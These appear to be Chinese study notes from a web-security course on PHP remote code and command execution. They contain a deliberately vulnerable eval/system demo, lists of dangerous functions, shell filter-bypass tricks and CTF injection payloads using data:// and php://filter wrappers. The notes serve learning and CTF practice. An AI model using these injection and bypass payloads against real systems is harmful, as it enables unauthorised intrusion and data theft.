---
categories:
  - 网络安全
date: 2026-01-27
description: 小迪secWeb攻防学习笔记RCE命令执行
slug: 10
tags:
  - 
title: Web攻防-58天RCE命令执行
cover:
  image: 
  relative: flase
---

# RCE-利用&绕过&异或&回显
-RCE 代码执行：引用脚本代码解析执行（代码层面）

-RCE 命令执行：脚本调用操作系统命令（系统层面）

参考代码;
```php
<?php

  

//RCE代码执行 ->命令执行

//http://192.168.1.4:82/rce/test.php?c=system('ver');

//$code=$_GET['c'];

//eval($code);

//http://192.168.1.4:82/rce/test.php?c=phpinfo();

//$code=phpinfo();

//将phpinfo();当做当前语言代码去执行 代码执行漏洞

//产生条件：可控变量code 触发函数eval

  

//$code=system('ver');

  
  

//$code=$_GET['c'];

//assert($code);

  

//eval()、assert()、preg_replace()、create_function()、

//array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()

  

//RCE命令执行

//$cmd=$_GET['c'];

//system($cmd);

//echo "<hr>";

//

//echo exec($cmd);

//echo "<hr>";

//

//echo shell_exec($cmd);

//echo "<hr>";

//

//passthru($cmd);

//echo "<hr>";

  

echo ("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60");

  

//http://192.168.1.4:82/rce/test.php?c=ver

//$cmd=ver

//将ver当做当前系统命令去执行 命令执行漏洞

//产生条件：可控变量cmd 触发函数system

//用到php去运行代码

//system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
```

漏洞函数：

1、**PHP**:

PHP代码执行函数：
```php
eval();
assert();
preg_replace();
creat_function();
array_map();
call_user_func();
call_user_func_array();
array_filter();
uasort();等
```
PHP命令执行函数：
```php
system();
exec();
shell_exec();
pcntl_exec();
popen();
proc_popen();
passthru();等
```

2、**python**
```python
eval
exec
subprocess
os.system
commands
```

3、Java

Java中没有类似php中eval函数这种直接可以将字符串转换为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达引擎，如：OGNL、SpEL、MVEL等。

反弹shell可以使用棱角社区的工具生成命令.

## 绕过
### （1）关键词过滤：

1、过滤flag关键字，采用通配符
```bash
flag=fl*
cat fl*
cat ?la*
```

2、转义符号
```bash
ca\t /fl\ag
cat fl''ag
使用空变量$*和$@,$x.${x}绕过
ca$*t fl$*ag
ca$@ fl$@ag
ca$5t f$5lag
ca${2}t f${2}lag
```

3、拼接法
```bash
a=fl;b=ag;cat$IFS$a$b
```

4、反引号绕过
```bash
cat `ls`
```

5、编码绕过
```bash
echo 'flag' | base64
cat `echo ZmxhZwo= | bash64 -d`
```

6、组合绝活
```bash
touch "ag"
touch "fl\\"
touch "t \\"
touch "ca\\"
ls -t >shell
sh shell

# \指的是换行
# ls -t 是将文本按时间排序输出
# ls -t >shell 将输出输入到shell文件中
# sh将文本中的文字读取出来执行
```

7、异或无符号（过滤0-9a-zA-Z）
```bash
异或：rce-xor.php & rce-xor.py
或：rce-xor-or.php & rce-xor-or.py
```
代码参考：058-Web攻防-RCE执行&DEMO&异或脚本生成等.zip

### （2）过滤函数关键字

1、内敛执行绕过（system）
```bash
echo `ls`;
echo $(ls);
?><?=`ls`
?><?=$(ls);
```

2、过滤执行命令（如 cat tac等）
```bash
more：一页一页的显示档案内容
less：与more类似
head：查看头几行
tac：从最后一行开始显示，可以看出tac是cat的反向显示
tail：查看尾几行
nl：显示的适合，顺便输出行号
od：以二进制的方式读取档案内容
vi：一种编辑器，这个也可以查看
vim：一种编辑器，这个也可以查看
sort：可以查看
uniq：可以查看
file -f：报错出具体内容
sh /flag 2>%261 //报错出文件内容
curl file:///root/f/flag
strings flag
uniq -c flag
bash -v flag
rev flag
```

3、过滤空格
```bash
%09(url传递) (cat%09flag.php)
cat${IFS}flag
a=fl;b=ag;cat$IFS$a$b
{cat,flag}
```

### （3）无回显利用
1、直接写个文件访问查看

2、直接进行对外访问接受

# 白盒-CTF-RCE代码命令
29-通配符
```php
system('tac fla*.php');
```
30-取代函数&通配符&管道符
```php
`cp fla*.ph* 2.txt`;
echo shell_exec('tac fla*.ph*');
```
31-参数逃逸
```php
eval ($_GET[1]);&1=system('tac flag.php');
```
32-36配合包含&伪协议
```php
include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```
37-39包含RCE&伪协议&通配符
```php
data://text/plain,<?=system('tac fla*');?>
php://input post:<?php system('tac flag.php');?>
```

# 黑盒-运行-RCE 代码命令执行
代码在线运行平台可以进行测试

